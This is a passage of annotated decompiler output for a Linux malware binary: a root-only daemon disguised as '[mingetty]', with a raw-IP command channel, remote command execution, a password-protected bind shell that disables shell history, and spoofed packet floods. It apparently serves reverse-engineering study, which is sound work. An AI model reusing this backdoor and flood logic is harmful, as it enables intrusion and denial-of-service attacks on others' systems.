/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: 'the-binary'
 */


L08048080()
{



    return(L080675A8());
}

extern /* addr: 08048088 */  /*	Procedure: 0x08048088 - 0x0804808F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08048088()

__entry_point__()
{
	/* unknown */ void  Vfffffff4;



    (restore)ecx;
    ebx = esp;
    eax = esp;
    eax = eax + ecx + ecx + ecx + ecx + 4;
    (save)0;
    (save)0;
    (save)0;
    ebp = esp;
    (save)eax;
    (save)ebx;
    (save)ecx;
    eax = 136; // PER_LINUX32?
    ebx = 0;
    // personality syscall
    asm("int 0x80");
    environ = Vfffffff4;
    L0805756C( globalvar000 & 65535);
    L08056D44();
    L08055F08(0x80675d0);
    L08048080();
    L08048134();
    (save)eax;
    some_sort_of_cleanup();
    // exit syscall
    for((restore)ebx; 1; asm("int 0x80");) {
        eax = 1;
    }
    goto L08048101;
}



#define BUFLEN 2048

L08048134()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 17648;
    (save)edi;
    (save)esi;
    (save)ebx;
    ebx = *(ebp + 12);
    *(ebp + -17600) = 1;
    char buffer[BUFLEN];
    //*(ebp + -17616) = ebp + -2048;
    *(ebp + -17620) = ebp + -2028;
    *(ebp + -17624) = ebp + -2026;
    *addrlen = 16;

    // check for root privileges

    if(geteuid() != 0) {
        (save)-1;
        some_sort_of_cleanup();
    }
    edx = *ebx;
    al = 0;
    edi = edx;
    memset(edx, 0, strlen(edi) );
    edx = *ebx;
    *edx = *"[mingetty]";
    *(edx + 4) = *"getty]";
    *(edx + 8) = *"y]";
    *(edx + 10) = *"";
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 20;
    if(fork() != 0) {
        (save)0;
        some_sort_of_cleanup();
    }
    setsid();
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 8;
    if(fork() != 0) {
        some_sort_of_cleanup(0);
    }

    // continue with child process

    chdir("/");
    close(0);
    close(1);
    close(2);
    globalvar002 = 0;
    globalvar003 = 0;
    globalvar004 = 0;
    time(0);
    esp = esp + 20;
    L080559A0(eax);
    sockfd = socket(AF_INET, SOCK_RAW, NVP);
    signal_action(SIGHUP, SIG_IGN);
    signal_action(SIGTERM, SIG_IGN);
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 36;
    signal_action(SIGCHLD, SIG_IGN);
    //    *(ebp + -17632) = ebp + -4096;
    char *bufend = buffer[BUFLEN - 1];
    for(*(ebp + -17636) = ebp + -4536; 1; precise_sleep(10000)) {
        esi = recv( sockfd, buffer, BUFLEN, 0);
        if(*( buffer + 9) == 11 && *( *(ebp + -17620)) == 2 && esi > 200) {
            L0804A1E8(esi - 22, *(ebp + -17624), *(ebp + -17632));
            eax = ( *(ebp + -4095) & 255) - 1;
            if(eax <= 11) {
	      // case statement (TOM)?
                goto *(eax * 4 + 0x804832c)[L0804835c, L080483f0, L08048590, L0804871c, L080487c8, L08048894, L08048acc, L08048b58, L08048b80, L08048c34, L08048d08, L08048de4, ]goto ( *(eax * 4 + 0x804832c));

		// case 0

                al = globalvar005;
                *(ebp + -2048) = al;
                eax = globalvar006;
                *(ebp + -2048) = al;
                *(ebp + -2047) = 1;
                *(ebp + -2046) = 7;
                if(globalvar002 == 0) {
L080483a0:
                    *(ebp + -2045) = 0;
                } else {
                    *(ebp + -2045) = 1;
                    *(ebp + -2044) = globalvar004;
                }
                L0804A194(400, ebp + -2048, *(ebp + -17632));
                rand();
                ecx = 201;
                asm("cdq");
                (save)ecx / ecx % ecx / ecx + 400;
		// (save) (rand() % 201) + 400;
                (save) *(ebp + -17632);
                (save) *(ebp + -17636);
                L08048ECC();
                esp = esp + 24;
            }
        }
L08048eb8:
    }
    goto L080483a0;

    // case 1

    globalvar007 = *(ebp + -4094) & 255;
    globalvar008[0] = *(ebp + -2032);
    globalvar008[1] = *(ebp + -2031);
    globalvar008[2] = *(ebp + -2030);
    globalvar008[3] = *(ebp + -2029);
    time(0);
    L080559A0(globalvar008[3]);
    rand();
    ecx = 10;
    asm("cdq");
    edi = ecx / ecx % ecx / ecx;
    ebx = 0;
    esi = 0;
L08048454:
    if(ebx != edi) {
        if(globalvar007 == 2) {
            al = *(ebp + ebx * 4 + -4093);
            edx = *(ebp + -17636);
            *(edx + esi) = al;
            *(esi + edx + 1) = *(ebp + ebx * 4 + -4092);
            *(esi + edx + 2) = *(ebp + ebx * 4 + -4091);
            al = *(ebp + ebx * 4 + -4090);
        } else {
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636)) = al;
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636) + 1) = al;
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            *(esi + *(ebp + -17636) + 2) = al;
            eax = rand();
            *(ebp + -17648) = eax;
            if(eax < 0) {
                *(ebp + -17648) = eax + 255;
            }
            edx = *(ebp + -17636);
        }
        *(esi + edx + 3) = al;
    }
    esi = esi + 4;
    ebx = ebx + 1;
    if(ebx <= 9) {
        goto L08048454;
    }
    eax = globalvar007;
    if(eax == 0) {
        edi = 0;
    }
    if(eax == 2) {
        goto L08048eb8;
    }
    edi = edi << 2;
    *(ebp + -17644) = edi;
    al = *(ebp + -4093);
    ecx = *(ebp + -17636);
    *(edi + ecx) = al;
    al = *(ebp + -4092);
    edx = *(ebp + -17644);
    *(edx + ecx + 1) = al;
    *(edx + ecx + 2) = *(ebp + -4091);
    *(edx + ecx + 3) = *(ebp + -4090);
    goto L08048eb8;

    // case 2

    eax = fork();
    globalvar003 = eax;
    if(globalvar003 != 0) {
        goto L08048eb8;
    }
    setsid();
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 8;
    if(fork() != 0) {
        (save)10;
        sleep();
        kill(globalvar003, 9);
        (save)0;
        some_sort_of_cleanup();
    }
    ebx = 0;
L080485dc:
    *(ebx + ebp + -4096) = *(ebx + ebp + -4094);
    ebx = ebx + 1;
    if(ebx <= 397) {
        goto L080485dc;
    }
    ebx = ebp + -2048;
    sprintf(ebx, "/bin/csh -f -c \"%s\" 1> %s 2>&1", *(ebp + -17632), "/tmp/.hj237349");
    system(ebx);
    eax = fopen("/tmp/.hj237349", "rb");
    *(ebp + -17628) = eax;
    if(*(ebp + -17628) != 0) {
        edi = 0;
        *(ebp + -17640) = ebp + -4496;
L08048644:
        fread(ebp + -2048, 1, 398, *(ebp + -17628));
        *(eax + ebp + -2048) = 0;
        ebx = 0;
L08048670:
        *(ebx + ebp + -4094) = *(ebx + ebp + -2048);
        ebx = ebx + 1;
        if(ebx <= 397) {
            goto L08048670;
        }
        if(edi == 0) {
            *(ebp + -4095) = 3;
            edi = 1;
        } else {
            *(ebp + -4095) = 4;
        }
        L0804A194(400, *(ebp + -17632), *(ebp + -17640));
        rand();
        ecx = 201;
        asm("cdq");
        ebx = ecx / ecx % ecx / ecx;
        (save)ebx + 400;
        (save) *(ebp + -17640);
        (save) *(ebp + -17636);
        L08048ECC();
        precise_sleep(400000);
        esp = esp + 28;
        if(esi != 0) {
            goto L08048644;
        }
        fclose(*(ebp + -17628));
        unlink("/tmp/.hj237349");
    }
    exit(0);

    // case 3

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 4;
    eax = fork();
    globalvar002 = eax;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;
    ebx = 0;
L08048760:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17587);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048760;
    }
    L08049174( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, 0, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, ebp + -17596);
    exit(0);

    // case 4

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 5;
    eax = fork();
    globalvar002 = eax;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    edi = ebp + -17596;
    esi = ebp + -4096;
    // could be a memcopy
    // memcpy(ebp + -17596, ebp + -4096, 63)
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;

    // end of memcpy?

    ebx = 0;
L0804880c:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17583);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L0804880c;
    }
    L080499F4( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, ebp + -17596);
    exit(0);

    // case 5

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 6;
    signal_action(SIGCHLD, SIG_IGN);
    eax = fork();
    globalvar002 = eax;
    esp = esp + 8;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    setsid();
    signal_action(SIGCHLD, SIG_IGN);

    struct sockaddr *my_addr;

    my_addr->sin_family = AF_INET;
    my_addr->sin_port = 61786; // network byte order, real port is 23281
    my_addr->sin_addr = 0; // wildcard address

    *optval = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, IP);
    signal_action(SIGCHLD, SIG_IGN);
    signal_action(SIGCHLD, SIG_IGN);
    signal_action(SIGHUP, SIG_IGN);
    esp = esp + 36;
    signal_action(SIGTERM, SIG_IGN);
    signal_action(SIGINT, SIG_IGN);
    setsockopt( sockfd, SOL_SOCKET, SO_REUSEADDR , optval, 4);
    bind(sockfd, my_addr, 16);
    listen( sockfd, 3);
L08048984:
    client_sockfd = accept( sockfd, ebp + -4568 /* struct  sockaddr  *addr */ , addrlen);
    if(client_sockfd != 0) {
        if(fork() != 0) {
            goto L08048984;
        }
        recv( client_sockfd, ebp + -17340, 19, 0);
        ebx = 0;
L080489d4:
        al = *(ebx + ebp + -17340);
        if(al == 10 || al == 13) {
            *(ebx + ebp + -17340) = 0;
        } else {
            *(ebx + ebp + -17340) = al;
            *(ebx + ebp + -17340) = *(ebx + ebp + -17340) + 1;
        }
        ebx = ebx + 1;
        if(ebx <= 18) {
            goto L080489d4;
        }

	// possibly a memcmp, not sure what first string is, though.
	// probably ebp + -17340 there is the following line ine the asm file
	// lea    0xffffbc44(%ebp),%esi
	// memcmp(ebp + -17340 , edi, 6)

	//        edi = "TfOjG";
	//        ecx = 6;
	//        asm("cld");
	//        asm("repe cmpsb");
	//        if(!(esi = ebp + -17340)) {

	if (!memcmp(ebp + -17340, "TfOjG", 6) {
            send(client_sockfd, 0x806761d, 4, 0);
            close(client_sockfd);
            some_sort_of_cleanup(1);
        }
        dup2(client_sockfd, 0);
        dup2(client_sockfd, 1);
        dup2(client_sockfd, 2);
        setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1);
        unsetenv("HISTFILE"); 
        setenv("TERM", "linux", 1);
        execl("/bin/sh", "sh", 0);
        close(client_sockfd);
        esp = esp + 32;
        some_sort_of_cleanup(0);
    }
    some_sort_of_cleanup(0);

    // case 6

    eax = fork();
    globalvar003 = eax;
    if(globalvar003 != 0) {
        goto L08048eb8;
    }
    setsid();
    signal_action(SIGCHLD, SIG_IGN);
    esp = esp + 8;
    if(fork() != 0) {
        (save)1200;
        sleep();
        kill(globalvar003, 9);
        (save)0;
        some_sort_of_cleanup();
    }
    ebx = 0;
L08048b1c:
    *(ebx + ebp + -4096) = *(ebx + ebp + -4094);
    ebx = ebx + 1;
    if(ebx <= 397) {
        goto L08048b1c;
    }
    ebx = ebp + -2048;
    sprintf(ebx, "/bin/csh -f -c \"%s\" ", *(ebp + -17632));
    system(ebx);
    exit(0);

    // case 7

    // kills the process stored in globalvar002, if it exists

    eax = globalvar002;
    if(eax == 0) {
        goto L08048eb8;
    }
    kill(eax, 9);
    globalvar002 = 0;
    goto L08048eb8;

    // case 8

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 9;
    eax = fork();
    globalvar002 = eax;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }

    // memcpy(edi, esi, 63);

    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;

    // end of memcpy?

    ebx = 0;
L08048bc4:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17586);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048bc4;
    }
    L08049174( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, ebp + -17596);
    exit(0);

    // case 9

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 10;
    eax = fork();
    globalvar002 = eax;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }

    // memcpy(edi, esi, 63);

    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;

    // end of memcpy?

    ebx = 0;
L08048c78:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17582);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048c78;
    }
    L08049D40( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, 0, *(ebp + -4083) & 255, ebp + -17596);
    exit(0);

    // case 10

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 11;
    eax = fork();
    globalvar002 = eax;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }

    // memcpy(edi, esi, 63);

    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;

    // end of memcpy?

    ebx = 0;
L08048d4c:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17581);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048d4c;
    }
    L08049D40( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, *(ebp + -4083) & 255, *(ebp + -4082) & 255, ebp + -17596);
    exit(0);

    // case 11

    if(globalvar002 != 0) {
        goto L08048eb8;
    }
    globalvar004 = 12;
    eax = fork();
    globalvar002 = eax;
    if(globalvar002 != 0) {
        goto L08048eb8;
    }

    // memcpy(edi, esi, 63);

    edi = ebp + -17596;
    esi = ebp + -4096;
    asm("cld");
    ecx = 63;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    *edi = *(esi + 4);
    edi = edi + 1;
    esi = esi + 1;

    // end of memcpy?

    ebx = 0;
L08048e28:
    *(ebx + ebp + -17596) = *(ebx + ebp + -17582);
    ebx = ebx + 1;
    if(ebx <= 254) {
        goto L08048e28;
    }
    L08049564( *(ebp + -4094) & 255, *(ebp + -4093) & 255, *(ebp + -4092) & 255, *(ebp + -4091) & 255, *(ebp + -4090) & 255, *(ebp + -4089) & 255, *(ebp + -4088) & 255, *(ebp + -4087) & 255, *(ebp + -4086) & 255, *(ebp + -4085) & 255, *(ebp + -4084) & 255, *(ebp + -4083) & 255, ebp + -17596);
    exit(0);
    goto L08048eb8;
}


L08048ECC(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    if(globalvar007 != 0) {
        esi = A8 + 36;
        do {
            precise_sleep(4000);
            L08048F94(&globalvar008, ebx, Ac, A10);
            ebx = ebx + 4;
        } while(ebx <= esi);
    } else {
        L08048F94(0x807e780, A8, Ac, A10);
    }
    return(1);
}




L08048F94(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    ebx = Ac;
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffffbc = eax;
    if(Vffffffbc != -1) {
        esi = malloc(A14 + 23);
        if(esi != 0) {
            goto L08048fd8;
        }
    }
    eax = 0;
    goto L0804912c;
L08048fd8:
    Vffffffc4 = esi;
    Vffffffc0 = esi + 20;
    Vffffffc8 = esi + 22;
    *(esi + 12) = *A8;
    *(esi + 13) = *(A8 + 1);
    *(esi + 14) = *(A8 + 2);
    *(esi + 15) = *(A8 + 3);
    *(esi + 16) = *ebx;
    *(esi + 17) = *(ebx + 1);
    *(esi + 18) = *(ebx + 2);
    *(esi + 19) = *(ebx + 3);
    ebx = & Vffffffd0;
    sprintf(ebx, "%d.%d.%d.%d", *ebx & 255, *(ebx + 1) & 255, *(ebx + 2) & 255, *(ebx + 3) & 255);
    Vfffffff4 = L08049138(ebx);
    Vfffffff2 = 10;
    Vfffffff0 = 2;
    *esi = 69;
    *(esi + 8) = 250;
    *(esi + 9) = 11;
    *(esi + 2) = ntohs(A14 + 22);
    *(esi + 1) = 0;
    *(esi + 4) = ntohs(rand());
    *(esi + 6) = 0;
    *(esi + 10) = 0;
    edx = 20;
    ecx = esi;
    ebx = 0;
    Vffffffce = 0;
    do {
        ebx = ebx + ( *ecx & 65535);
        ecx = ecx + 2;
        edx = edx + -2;
    } while(edx > 1);
    != ? 0x80490b1 : ;
    Vffffffce = *ecx;
    ebx = ebx + (Vffffffce & 65535);
    edx = ebx >> 16;
    ebx = (bx & 65535) + edx;
    ax = !(ebx + (ebx >> 16));
    Vffffffce = ax;
    *(Vffffffc4 + 10) = Vffffffce;
    *Vffffffc0 = 3;
    L0805652C(Vffffffc8, A10, A14);
    if(sendto(Vffffffbc, esi, A14 + 22, 0, & Vfffffff0, 16) == -1) {
        (save)esi;
        free();
        eax = 0;
    } else {
        close();
        free(esi, Vffffffbc);
        eax = 1;
    }
L0804912c:
    esp = ebp - 80;
}



L08049138(A8)
/* unknown */ void  A8;
{



    ecx = gethostbyname(A8);
    if(ecx != 0) {
        edx = *( *(ecx + 16));
        L0805652C(&globalvar009, edx, *(ecx + 12));
        return(globalvar009);
    }
    esp = ebp;
    return(0);
}



L08049174(A8, Ac, A10, A14, A18, A1c, A20, A24, A28)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff98c;
	/* unknown */ void  Vfffff990;
	/* unknown */ void  Vfffff994;
	/* unknown */ void  Vfffff998;
	/* unknown */ void  Vfffff99c;
	/* unknown */ void  Vfffff9a0;
	/* unknown */ void  Vfffff9a4;
	/* unknown */ void  Vfffff9a8;
	/* unknown */ void  Vfffff9ac;
	/* unknown */ void  Vfffff9b0;
	/* unknown */ void  Vfffff9b4;
	/* unknown */ void  Vfffff9b8;
	/* unknown */ void  Vfffff9bc;
	/* unknown */ void  Vfffff9c2;
	/* unknown */ void  Vfffff9c4;
	/* unknown */ void  Vfffff9c8;
	/* unknown */ void  Vfffff9d4;
	/* unknown */ void  Vfffff9d5;
	/* unknown */ void  Vfffff9d6;
	/* unknown */ void  Vfffff9d7;
	/* unknown */ void  Vfffff9dc;
	/* unknown */ void  Vfffff9e4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffdda;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde8;
	/* unknown */ void  Vffffffdc;



    Vfffff9bc = A8;
    Vfffff9b8 = Ac;
    Vfffff9b4 = A10;
    Vfffff9b0 = A14;

    // memcpy(edi, esi, 9);

    edi = & Vffffffdc;
    esi = 0x8067698;
    asm("cld");
    ecx = 9;
    asm("rep movsd");
    Vfffff9ac = 1;

    // memcpy(edi, esi, 125);

    edi = & Vfffffde8;
    esi = 0x80676bc;
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    esi = & Vfffff9c8;
    Vfffff9a4 = & Vfffff9dc;
    Vfffff9a0 = & Vfffff9e4;
    Vfffffdd8 = 2;
    Vfffffdda = 0;
    if(A18 != 0) {
        A18 = A18 - 1;
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vfffff9a8 = eax;
    if(Vfffff9a8 > 0) {
        Vfffff99c = 0;
        Vfffff998 = 0;
        memset(esi, 0, 1024);
        while(1) {
            edi = 0;
            if(A24 != 0 && Vfffff998 <= 0) {
                edx = gethostbyname(A28);
                if(edx != 0) {
L08049288:
                    bcopy( *( *(edx + 16)), & Vfffff9c4, 4);
                    *(esi + 12) = Vfffff9c4;
                    Vfffff998 = 40000;
                } else {
                    sleep(600);
                    edi = 1;
                }
            }
            if(edi != 0) {
                continue;
            }
            edi = 0;
            Vfffff990 = 0;
            do {
                if(Vfffff9ac != 1) {
                    edx = 0;
                } else {
                    Vfffff9ac = 0;
                    random();
                    ebx = 8000;
                    asm("cdq");
                    edx = ebx / ebx % ebx / ebx;
		    // edx = random() % 8000; ?

                }
                if(*(edx * 4 + 0x806d22c) != 0) {
                    Vfffff994 = edx * 4 + 0x806d22c;
                    do {
                        Vfffffddc = *Vfffff994;
                        edx = ebp + Vfffff990 + -536;
                        L0805652C(Vfffff9a0, edx, *(ebp + edi * 4 - 36));
                        random();
                        ebx = 255;
                        asm("cdq");
                        edx = ebx / ebx % ebx / ebx;
			// edx = random() % 255; ?

                        *Vfffff9a0 = dl;
                        random();
                        ebx = 255;
                        asm("cdq");
                        edx = ebx / ebx % ebx / ebx;
			// edx = random() % 255; ?

                        *(Vfffff9a0 + 1) = dl;
                        if(A1c != 0 || A20 != 0) {
                            ax = (A1c << 8) + A20;
                        } else {
                            random();
                            ebx = 30000;
                            asm("cdq");
                            edx = ebx / ebx % ebx / ebx;
			    // edx = random() % 30000; ?

                            eax = edx;
                        }
                        *Vfffff9a4 = htons(ax);
                        ebx = Vfffff9a4;
                        *(ebx + 2) = 13568;
                        *(ebx + 4) = htons(*(ebp + edi * 4 - 36) + 8);
                        *(ebx + 6) = 0;
                        if(A24 == 0) {
                            Vfffff9d4 = Vfffff9bc;
                            Vfffff9d5 = Vfffff9b8;
                            Vfffff9d6 = Vfffff9b4;
                            Vfffff9d7 = Vfffff9b0;
                        }
                        *(esi + 16) = *Vfffff994;
                        *esi = 69;
                        random();
                        ebx = 130;
                        asm("cdq");
                        *(esi + 8) = ebx / ebx % ebx / ebx + 120;
			// *(esi + 8) = (random() % 130) + 120;
                        random();
                        ebx = 255;
                        asm("cdq");
                        *(esi + 4) = ebx / ebx % ebx / ebx;
			// *(esi + 4) = random() % 255;
                        *(esi + 9) = 17;
                        *(esi + 6) = 0;
                        *(esi + 2) = htons(*(ebp + edi * 4 - 36) + 28);
                        *(esi + 10) = 0;
                        edx = 20;
                        Vfffff98c = & Vfffff9c8;
                        ecx = 0;
                        Vfffff9c2 = 0;
                        do {
                            ebx = Vfffff98c;
                            ecx = ecx + ( *ebx & 65535);
                            ebx = ebx + 2;
                            Vfffff98c = ebx;
                            edx = edx + -2;
                        } while(edx > 1);
                        != ? 0x804948b : ;
                        Vfffff9c2 = *ebx;
                        ecx = ecx + (Vfffff9c2 & 65535);
                        edx = ecx >> 16;
                        ecx = (cx & 65535) + edx;
                        ax = !(ecx + (ecx >> 16));
                        Vfffff9c2 = ax;
                        *(esi + 10) = Vfffff9c2;
                        sendto(Vfffff9a8, & Vfffff9c8, *(ebp + edi * 4 - 36) + 28, 0, & Vfffffdd8, 16);
                        if(A18 != 0) {
                            if(Vfffff99c != A18) {
                                Vfffff99c = Vfffff99c + 1;
                                goto L0804951a;
                            }
                            precise_sleep(300);
                            Vfffff99c = 0;
                        } else {
                            precise_sleep(300);
                        }
                        Vfffff998 = Vfffff998 - 1;
L0804951a:
                        Vfffff994 = Vfffff994 + 4;
                    } while(*Vfffff994 != 0);
                }
                Vfffff990 = Vfffff990 + 50;
                edi = edi + 1;
            } while(edi <= 8);
        }
        goto L08049288;
    }
    globalvar002 = 0;
    esp = ebp + -1664;
    return(0);
}



L08049564(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
/* unknown */ void  A38;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff974;
	/* unknown */ void  Vfffff978;
	/* unknown */ void  Vfffff97c;
	/* unknown */ void  Vfffff980;
	/* unknown */ void  Vfffff984;
	/* unknown */ void  Vfffff988;
	/* unknown */ void  Vfffff98c;
	/* unknown */ void  Vfffff990;
	/* unknown */ void  Vfffff994;
	/* unknown */ void  Vfffff998;
	/* unknown */ void  Vfffff99c;
	/* unknown */ void  Vfffff9a0;
	/* unknown */ void  Vfffff9a4;
	/* unknown */ void  Vfffff9a8;
	/* unknown */ void  Vfffff9ac;
	/* unknown */ void  Vfffff9b2;
	/* unknown */ void  Vfffff9b4;
	/* unknown */ void  Vfffff9b8;
	/* unknown */ void  Vfffff9d8;
	/* unknown */ void  Vfffff9e4;
	/* unknown */ void  Vfffff9e5;
	/* unknown */ void  Vfffff9e6;
	/* unknown */ void  Vfffff9e7;
	/* unknown */ void  Vfffff9e8;
	/* unknown */ void  Vfffff9e9;
	/* unknown */ void  Vfffff9ea;
	/* unknown */ void  Vfffff9eb;
	/* unknown */ void  Vfffff9ec;
	/* unknown */ void  Vfffff9f4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffdda;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde8;
	/* unknown */ void  Vffffffdc;



    Vfffff9ac = A8;
    Vfffff9a8 = Ac;
    Vfffff9a4 = A10;
    Vfffff9a0 = A14;
    Vfffff99c = A18;
    Vfffff998 = A1c;
    Vfffff994 = A20;
    Vfffff990 = A24;

    // memcpy(edi, esi, 9);

    edi = & Vffffffdc;
    esi = 0x8067698;
    asm("cld");
    ecx = 9;
    asm("rep movsd");

    // memcpy(edi, esi, 125);

    edi = & Vfffffde8;
    esi = 0x80676bc;
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    edi = & Vfffff9d8;
    Vfffff988 = & Vfffff9ec;
    Vfffff984 = & Vfffff9f4;
    Vfffffdd8 = 2;
    Vfffffdda = 0;
    if(A34 == 0) {
        sprintf( & Vfffff9b8, "%d.%d.%d.%d", Vfffff9ac & 255, Vfffff9a8 & 255, Vfffff9a4 & 255, Vfffff9a0 & 255);
    }
    if(A28 != 0) {
        A28 = A28 - 1;
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vfffff98c = eax;
    if(Vfffff98c > 0) {
        Vfffff980 = 0;
        Vfffff97c = 0;
        memset(edi, 0, 1024);
        while(1) {
            esi = 0;
            if(A34 != 0 && Vfffff97c <= 0) {
                edx = gethostbyname(A38);
                if(edx != 0) {
L080496cc:
                    bcopy( *( *(edx + 16)), & Vfffff9b4, 4);
                    eax = Vfffff9b4;
                    *(edi + 16) = eax;
                    Vfffffddc = *(edi + 16);
                    Vfffff97c = 40000;
                } else {
                    sleep(600);
                    esi = 1;
                }
            }
            if(esi != 0) {
                continue;
            }
            esi = 0;
            Vfffff978 = ebp;
            do {
                if(A34 == 0) {
                    Vfffffddc = L0804CE8C( & Vfffff9b8);
                }
                L0805652C(Vfffff984, Vfffff978 + -536, *(ebp + esi * 4 - 36));
                random();
                ebx = 255;
                asm("cdq");
                edx = ebx / ebx % ebx / ebx;
		// edx = random() % 255;
                *Vfffff984 = dl;
                random();
                ebx = 255;
                asm("cdq");
                edx = ebx / ebx % ebx / ebx;
		// edx = random() % 255;
                *(Vfffff984 + 1) = dl;
                if(A2c != 0 || A30 != 0) {
                    ax = (A2c << 8) + A30;
                } else {
                    random();
                    ebx = 30000;
                    asm("cdq");
                    eax = ebx / ebx % ebx / ebx;
